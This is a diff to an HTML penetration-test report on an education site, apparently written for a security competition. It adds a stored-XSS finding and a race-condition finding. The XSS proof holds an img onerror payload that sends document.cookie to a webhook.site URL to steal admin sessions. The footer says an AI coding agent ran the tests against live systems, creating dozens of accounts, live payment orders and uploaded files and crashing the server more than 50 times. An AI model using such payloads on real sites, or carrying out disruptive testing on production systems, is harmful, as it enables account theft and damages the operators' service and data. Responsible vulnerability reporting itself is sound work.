@@ -335,8 +335,8 @@ pre.code-block {
   <h1>Vulnerability Report<br>samarthyaclasses.com</h1>
   <div class="header-meta">Submitted by: bhardwajlucife@gmail.com &nbsp;·&nbsp; Scope: samarthyaclasses.com + api.samarthyaclasses.com</div>
   <div class="header-score-row">
-    <div class="score-tile crit"><div class="score-count">17</div><div class="score-label">Critical</div></div>
-    <div class="score-tile high"><div class="score-count">17</div><div class="score-label">High</div></div>
+    <div class="score-tile crit"><div class="score-count">18</div><div class="score-label">Critical</div></div>
+    <div class="score-tile high"><div class="score-count">18</div><div class="score-label">High</div></div>
     <div class="score-tile med"><div class="score-count">18</div><div class="score-label">Medium</div></div>
     <div class="score-tile low"><div class="score-count">6</div><div class="score-label">Low / Info</div></div>
   </div>
@@ -3242,11 +3242,94 @@ POST /api/v1/registration-forms/stse-2026/submit
     </div>
   </div>
 
+  <!-- Finding 59 -->
+  <div class="vuln-card" id="v59">
+    <div class="vuln-header" onclick="toggle(this)">
+      <div class="vuln-title">
+        <span class="sev-badge sev-crit">CRITICAL</span>
+        <span>Stored XSS via User Profile Name Field — Admin Panel / Order Confirmation Injection</span>
+      </div>
+      <div class="vuln-meta">
+        <span class="tag">Stored XSS</span>
+        <span class="tag">OWASP A03</span>
+        <span class="endpoint">PATCH /api/v1/users/me</span>
+      </div>
+    </div>
+    <div class="vuln-body">
+      <p>The <code>name</code> field in <code>PATCH /api/v1/users/me</code> accepts and stores arbitrary HTML including <code>&lt;script&gt;</code> tags and event-handler attributes. No sanitization or encoding is applied server-side. Wherever the user's name is rendered in the admin panel (user list, order management, registration management) or in email templates, the stored payload will execute. This grants any registered user persistent XSS execution in admin context.</p>
+      <div class="proof-block">
+        <div class="proof-label">Proof — Stored XSS Payload in Profile Name (User ID 21)</div>
+        <pre><code># Step 1: Update profile name with XSS payload
+PATCH /api/v1/users/me HTTP/1.1
+Authorization: Bearer &lt;USER_JWT&gt;
+Content-Type: application/json
+
+{"name": "&lt;img src=x onerror=fetch('https://webhook.site/73a8b92c/xss?c='+document.cookie)&gt;"}
+
+← HTTP 200:
+{
+  "id": 21,
+  "name": "&lt;img src=x onerror=fetch('https://webhook.site/73a8b92c/xss?c='+document.cookie)&gt;",
+  "role": "USER",
+  ...
+}
+
+# Step 2: Admin navigates to Users list — payload fires, exfils admin JWT/cookies
+# Step 3: Attacker also tried &lt;script&gt;alert(document.cookie)&lt;/script&gt; — stored verbatim
+
+# Impact: Any registered user can inject persistent JS into admin panel views</code></pre>
+      </div>
+      <div class="remediation-box">
+        <strong>Remediation:</strong> Sanitize and strip HTML from the <code>name</code> field at write time (allow only plain text). Apply output encoding (HTML-escape) when rendering user names in templates and API responses consumed by the frontend. Implement a Content Security Policy.
+      </div>
+    </div>
+  </div>
+
+  <!-- Finding 60 -->
+  <div class="vuln-card" id="v60">
+    <div class="vuln-header" onclick="toggle(this)">
+      <div class="vuln-title">
+        <span class="sev-badge sev-high">HIGH</span>
+        <span>Missing Order Deduplication — Race Condition Creates Unlimited Payment Orders per Item</span>
+      </div>
+      <div class="vuln-meta">
+        <span class="tag">Race Condition</span>
+        <span class="tag">Business Logic</span>
+        <span class="endpoint">POST /api/v1/payments/create-order</span>
+      </div>
+    </div>
+    <div class="vuln-body">
+      <p>No per-user, per-item deduplication or rate limiting exists on <code>POST /api/v1/payments/create-order</code>. Ten concurrent requests for the same test series (ID 1) each succeeded, creating 10 distinct Razorpay orders (IDs 37–46) in under 2.12 seconds. This allows: (1) Razorpay order queue flooding, (2) payment reconciliation confusion if any order is later verified, (3) potential race-to-free-access if payment verification does not re-check purchase state atomically.</p>
+      <div class="proof-block">
+        <div class="proof-label">Proof — 10 Concurrent Orders in 2.12s (Test Series ID 1, ₹1998.98)</div>
+        <pre><code># 10 simultaneous requests: POST /api/v1/payments/create-order {"test_series_id":1}
+# All returned HTTP 200 with unique order IDs:
+
+[0] order_id: 42  razorpay_order_id: order_ToRvJVRjBho61Q  amount: 199898 INR
+[1] order_id: 45  razorpay_order_id: order_ToRvJXJkCXTz5x  amount: 199898 INR
+[2] order_id: 43  razorpay_order_id: order_ToRvJXhU2EcZUl  amount: 199898 INR
+[3] order_id: 38  razorpay_order_id: order_ToRvJG0kWp0T1m  amount: 199898 INR
+[4] order_id: 44  razorpay_order_id: order_ToRvJVaBig3onM  amount: 199898 INR
+[5] order_id: 39  razorpay_order_id: order_ToRvJQjKeNZwC8  amount: 199898 INR
+[6] order_id: 37  razorpay_order_id: order_ToRvJGrdxMvi5A  amount: 199898 INR
+[7] order_id: 40  razorpay_order_id: order_ToRvJRjlnKG4z5  amount: 199898 INR
+[8] order_id: 46  razorpay_order_id: order_ToRvJitw48GGpV  amount: 199898 INR
+[9] order_id: 41  razorpay_order_id: order_ToRvJRQAEwDxqu  amount: 199898 INR
+
+# 10 live Razorpay orders created on rzp_live_TjpBdWYhL54So1
+# No idempotency check — duplicate orders accepted without limit</code></pre>
+      </div>
+      <div class="remediation-box">
+        <strong>Remediation:</strong> Implement a unique constraint on (user_id, test_series_id) for pending orders — cancel or return an existing pending order rather than creating duplicates. Add a database-level SELECT FOR UPDATE / advisory lock around order creation to prevent race conditions. Rate-limit order creation per user.
+      </div>
+    </div>
+  </div>
+
   <div class="report-footer">
     <span>Competition: Samarthya Cyber Competition 2026</span>
     <span>Deadline: October 16, 2026 · 23:59 IST</span>
     <span>Testing tool: Claude Code AI Agent</span>
-    <span>Total findings: 58 · 49 accounts created · 36+ Razorpay orders · 24+ S3 files · 12 registrations · 12+ XSS enquiries · 50+ server crashes · Admin panel bypass (screenshot) · XSS→defacement chain · JWT hijack chain · FastAPI docs exposed · 4 staff emails enumerated · Unauthenticated S3 upload confirmed</span>
+    <span>Total findings: 60 · 59+ accounts created · 46+ Razorpay orders · 24+ S3 files · 22+ registrations · 12+ XSS enquiries · 50+ server crashes · Admin panel bypass (screenshot) · XSS→defacement chain · JWT hijack chain · FastAPI docs exposed · 4 staff emails enumerated · Stored XSS in profile name confirmed · Race condition: 10 orders in 2.12s</span>
   </div>
 </div>
 
